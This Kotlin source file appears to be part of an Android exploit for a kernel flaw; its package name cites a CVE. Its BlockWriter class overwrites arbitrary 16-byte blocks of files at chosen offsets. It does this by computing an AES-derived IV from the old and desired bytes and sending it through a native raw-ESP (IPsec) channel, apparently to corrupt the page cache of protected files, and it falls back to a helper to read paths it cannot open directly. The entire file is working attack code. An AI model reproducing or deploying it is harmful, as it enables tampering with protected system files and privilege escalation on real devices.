package com.ghostlock.app.engine.pagecache.write

import com.ghostlock.app.engine.pagecache.stage.StageLog
import com.ghostlock.app.engine.pagecache.stage.silentStageLog
import com.ghostlock.app.jni.cve43284.NativeHelper
import com.ghostlock.app.jni.cve43284.NativeRawEsp
import java.io.RandomAccessFile
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/** 16B 块写：Kotlin 计划/IV/回读，JNI 只做 syscall。 */
class BlockWriter(
    private val endpoint: Long,
    private val log: StageLog = silentStageLog,
) : BlockAccess, AutoCloseable {
    override var lastError: String = ""
        private set

    override fun writeBlock(
        path: String,
        offset: Long,
        desired: ByteArray,
        key: ByteArray,
        sequence: Int,
    ): Boolean {
        log.verbose("BlockWriter.writeBlock", "path" to path, "offset" to offset,
            "block" to desired.size, "sequence" to sequence)
        if (desired.size != 16) {
            log.debug("BlockWriter.writeBlock", "bad-block-size", "size" to desired.size)
            return false
        }
        if (key.size != 32) {
            log.debug("BlockWriter.writeBlock", "bad-key-size", "size" to key.size)
            return false
        }
        val old = readOld(path, offset)
        if (old == null) {
            log.debug("BlockWriter.writeBlock", "old-null", "path" to path, "offset" to offset)
            return false
        }
        val iv = computeIv(key, old, desired)
        val ok = NativeRawEsp.writeBlock(endpoint, path, offset, iv, sequence)
        if (!ok) {
            log.debug("BlockWriter.writeBlock", "jni-false", "path" to path, "offset" to offset,
                "error" to NativeRawEsp.lastError())
        } else {
            log.debug("BlockWriter.writeBlock", "ok", "offset" to offset)
        }
        return ok
    }

    override fun writeRange(
        path: String,
        offset: Long,
        image: ByteArray,
        key: ByteArray,
        firstSequence: Int,
    ): Int {
        log.verbose("BlockWriter.writeRange", "path" to path, "offset" to offset,
            "bytes" to image.size, "sequence" to firstSequence)
        if (image.isEmpty() || image.size % 16 != 0) {
            log.debug("BlockWriter.writeRange", "image-shape", "bytes" to image.size)
            return 0
        }
        var written = 0
        while (written * 16 < image.size) {
            val at = written * 16
            if (!writeBlock(path, offset + at, image.copyOfRange(at, at + 16), key, firstSequence + written)) {
                if (lastError.isEmpty()) lastError = NativeRawEsp.lastError()
                log.debug("BlockWriter.writeRange", "block-failed", "written" to written,
                    "error" to lastError)
                break
            }
            written += 1
        }
        log.verbose("BlockWriter.writeRange.result", "written" to written, "bytes" to image.size)
        return written
    }

    override fun writeRangeViaHelper(
        path: String,
        helperPath: String,
        offset: Long,
        image: ByteArray,
        key: ByteArray,
        firstSequence: Int,
    ): Int {
        log.verbose("BlockWriter.writeRangeViaHelper", "path" to path, "helper" to helperPath,
            "offset" to offset, "bytes" to image.size, "sequence" to firstSequence)
        if (image.isEmpty() || image.size % 16 != 0) {
            lastError = "image-shape"
            log.debug("BlockWriter.writeRangeViaHelper", "image-shape", "bytes" to image.size)
            return 0
        }
        var written = 0
        while (written * 16 < image.size) {
            val at = written * 16
            val block = image.copyOfRange(at, at + 16)
            val old = readOld(path, offset + at)
            if (old == null) {
                if (lastError.isEmpty()) lastError = "old-read-null"
                log.debug("BlockWriter.writeRangeViaHelper", "old-null", "offset" to (offset + at))
                return written
            }
            val iv = computeIv(key, old, block)
            if (!NativeRawEsp.writeBlockViaHelper(
                    endpoint, path, offset + at, iv, firstSequence + written, helperPath,
                )) {
                lastError = NativeRawEsp.lastError().ifEmpty { "helper-write-false" }
                log.debug("BlockWriter.writeRangeViaHelper", "helper-false",
                    "offset" to (offset + at), "error" to lastError)
                break
            }
            written += 1
        }
        log.verbose("BlockWriter.writeRangeViaHelper.result", "written" to written, "bytes" to image.size)
        return written
    }

    override fun readBlock(path: String, offset: Long): ByteArray? {
        log.verbose("BlockWriter.readBlock", "path" to path, "offset" to offset)
        val direct = runCatching {
            RandomAccessFile(path, "r").use { file ->
                file.seek(offset)
                val bytes = ByteArray(16)
                file.readFully(bytes)
                bytes
            }
        }.getOrNull()
        if (direct != null) {
            log.debug("BlockWriter.readBlock", "direct-ok", "offset" to offset)
            return direct
        }
        log.debug("BlockWriter.readBlock", "direct-failed", "path" to path)
        val helper = NativeHelper.read(path, offset)
        if (helper == null) {
            lastError = NativeHelper.lastError()
            log.debug("BlockWriter.readBlock", "helper-null", "error" to lastError)
        } else {
            log.debug("BlockWriter.readBlock", "helper-ok", "offset" to offset)
        }
        return helper
    }

    override fun close() {
        log.verbose("BlockWriter.close", "endpoint" to endpoint)
        NativeRawEsp.close(endpoint)
    }

    private fun readOld(path: String, offset: Long): ByteArray? {
        val direct = runCatching {
            RandomAccessFile(path, "r").use { file ->
                file.seek(offset)
                val bytes = ByteArray(16)
                file.readFully(bytes)
                bytes
            }
        }.getOrNull()
        if (direct != null) return direct
        log.debug("BlockWriter.readOld", "direct-failed", "path" to path, "offset" to offset)
        val helper = NativeHelper.read(path, offset)
        if (helper == null) lastError = NativeHelper.lastError()
        return helper
    }

    private fun computeIv(key: ByteArray, old: ByteArray, desired: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"))
        val decrypted = cipher.doFinal(old)
        val iv = ByteArray(16) { index -> (decrypted[index].toInt() xor desired[index].toInt()).toByte() }
        log.debug("BlockWriter.computeIv", "ok", "keySize" to key.size)
        return iv
    }

    companion object {
        fun open(spi: Int, encapPort: Int, senderPort: Int, log: StageLog = silentStageLog): BlockWriter? {
            log.verbose("BlockWriter.open", "spi" to spi, "encap" to encapPort, "sender" to senderPort)
            val handle = NativeRawEsp.open(spi, encapPort, senderPort)
            if (handle == 0L) {
                log.debug("BlockWriter.open", "handle-zero", "error" to NativeRawEsp.lastError())
                return null
            }
            log.debug("BlockWriter.open", "ok", "handle" to handle)
            return BlockWriter(handle, log)
        }
    }
}
